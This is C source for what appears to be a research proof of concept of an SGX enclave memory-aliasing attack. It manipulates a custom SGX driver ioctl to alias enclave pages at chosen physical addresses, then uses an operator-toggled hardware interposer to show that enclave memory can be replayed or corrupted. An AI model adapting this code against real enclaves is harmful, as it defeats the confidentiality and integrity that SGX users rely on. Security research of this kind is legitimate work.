#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <unistd.h>
#include "libsgxstep/pt.h"
#include "libsgxstep/debug.h"
#include <signal.h>
#include <sys/reg.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <libelf.h>
#include <gelf.h>

#include "readalias.h"
#include "mem_range_repo.h"
#include "helpers.h"

#define DBG_ENCL           1
#define ALIAS_BIT          34
#define ALLOC_SIZE         1*PAGE_SIZE


sgx_enclave_id_t eid = 0;
unsigned char epc_buf1[ALLOC_SIZE], epc_buf2[ALLOC_SIZE];

// Hacky method to avoid linking problems :)
void* sgx_get_aep(void)
{
    return NULL;
}
void sgx_set_aep(void* aep)
{
}
void* sgx_get_tcs(void)
{
    return NULL;
}

void custom_hexdump(char* data, size_t data_len) {
    // Note: this offset simply selects a single line within the enclave buffer to print.
    data += 2304;
    data_len = 64;

    printf("hexdump buffer (%zu bytes):\n", data_len);
    for (size_t i = 0; i < data_len; i++) {
        printf("%02x ", (unsigned char)data[i]);
        if ((i + 1) % 32 == 0) { // Print 64 bytes per line
            printf("\n");
        }
    }
    printf("\n");
}

#define SGX_MAGIC 0xA4

#define SGX_IOC_EPC_PAGE_ADDR \
        _IOW(SGX_MAGIC, 0x00, struct sgx_epc_page_addr)

struct sgx_epc_page_addr  {
        unsigned long   pa;
        int alloc_nb;
        int nb_pages;
} __attribute__((__packed__));

int get_epc_page_offset(const char* filepath, const char* bufname) {
    int fd, nb_symbols, i, offset = 0;
    size_t shstrndx;
    const char *sym_name = NULL;

    Elf *e = NULL;
    Elf_Scn *scn = NULL;
    Elf_Data *data = NULL;
    GElf_Shdr shdr;
    GElf_Sym sym;

    if (elf_version(EV_CURRENT) == EV_NONE) {
        err_log("Failed to initialized ELF");
        return 0;
    }

    if ((fd = open(filepath, O_RDONLY)) < 0) {
        err_log("Failed to open ELF file %s\n", filepath);
        return 0;
    }

    if (!(e = elf_begin(fd, ELF_C_READ, NULL))) {
        err_log("elf_begin failed: %s\n", elf_errmsg(-1));
        return 0;
    }

    if (elf_getshdrstrndx(e, &shstrndx) != 0) {
        err_log("elf_getshdrstrndx failed: %s\n", elf_errmsg(-1));
        return 0;
    }


    while (offset == 0 && (scn = elf_nextscn(e, scn)) != NULL) {
        gelf_getshdr(scn, &shdr);
        if (shdr.sh_type == SHT_SYMTAB) {
            data = elf_getdata(scn, NULL);
            nb_symbols = shdr.sh_size / shdr.sh_entsize;

            for (i = 0; i < nb_symbols; ++i) {
                gelf_getsym(data, i, &sym);
                sym_name = elf_strptr(e, shdr.sh_link, sym.st_name);
                if (sym_name && strcmp(sym_name, bufname) == 0) {
                    offset = ((unsigned long)sym.st_value >> PAGE_SHIFT) + 2;
                    break;
                }
            }
        }
    }

    elf_end(e);
    close(fd);

    return offset;
}

page_stats_t stats;

int main( int argc, char **argv )
{

    //info_event("Opening driver...");
    if (open_kmod()) {
        err_log("Error: Unable to open driver.\n");
        return -1;
    }


    // Set up the address mapping.
    // We will assing the pce enclave consecutive physical addresses, starting at 0x7090000000
    int sgx_fd;

    // Open the SGX driver
    sgx_fd = open("/dev/isgx", O_RDWR);
    if (sgx_fd < 0) {
        perror("Failed to open /dev/isgx\n");
        return -1;
    }

    struct sgx_epc_page_addr args;
    // Setting up the SGX driver to ensure the pages belonging to the buffer
    // of the AAE are aliasing with the stack of the PCE.
    args.pa = 0x4001cb3001;
    args.alloc_nb = get_epc_page_offset("./Enclave/encl.so", "buffer");
    args.nb_pages = 0;
    ioctl(sgx_fd, SGX_IOC_EPC_PAGE_ADDR, &args);

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/DBG_ENCL,
                                    NULL, NULL, &eid, NULL ) );

    // Get the va of the buffer and translate it to its pa
    unsigned char *buffer;
    SGX_ASSERT( initialize_buffer(eid) );
    SGX_ASSERT( get_buffer_addr(eid, (void*)&buffer) );

    address_mapping_t *map = get_mappings(buffer);
    uint64_t pa = phys_address(map, PAGE);

    // Get the alias for the pa of the buffer
   
    printf("\nEnclave buffer allocated at va=0x%lx -- pa=0x%lx\n", buffer + 2304, pa + 2304);
    //printf("Targetting cache line at pa=0x%lx\n", pa + 2304);

    SGX_ASSERT( write_to_buffer(eid, 0x00) );
    SGX_ASSERT( flush_buffer(eid) );
    SGX_ASSERT( read_buffer(eid) );

    printf("\n\x1b[1;35mEnclave buffer is initialized to all zero\x1b[0m\n");
    SGX_ASSERT( print_buffer(eid) );
    printf("Enable interposer and press enter");
    getchar();

    printf("\n\x1b[1;35mSetting enclave buffer to 0xff...\x1b[0m\n");
    SGX_ASSERT( write_to_buffer(eid, 0xff) );
    SGX_ASSERT( flush_buffer(eid) );
    
    printf("\nDisable interposer press enter");
    getchar();

    printf("\n\x1b[1;35mReading back enclave buffer\x1b[0m\n");
    SGX_ASSERT( print_buffer(eid) );

    SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info_event("Done.");

    return 0;
}
